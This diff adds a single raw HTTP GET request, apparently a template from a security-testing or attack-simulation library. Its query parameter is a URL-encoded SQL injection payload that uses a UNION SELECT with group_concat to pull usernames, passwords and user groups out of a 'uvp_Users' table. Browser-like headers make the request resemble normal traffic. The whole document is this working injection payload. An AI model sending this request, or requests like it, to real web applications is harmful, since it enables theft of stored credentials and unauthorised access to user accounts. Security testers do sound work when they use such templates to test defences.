@@ -1,0 +1,6 @@
+GET /page{PICUSID}.htm?p=1%20union%20all%20select%201%2Cgroup%5Fconcat%28Username%2C0x3a%2CPassword%2C0x3a%2CUserGroup%29%2C3%2C4%2C5%20from%20uvp%5FUsers HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:41.0) Gecko/20100101 Firefox/41.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+
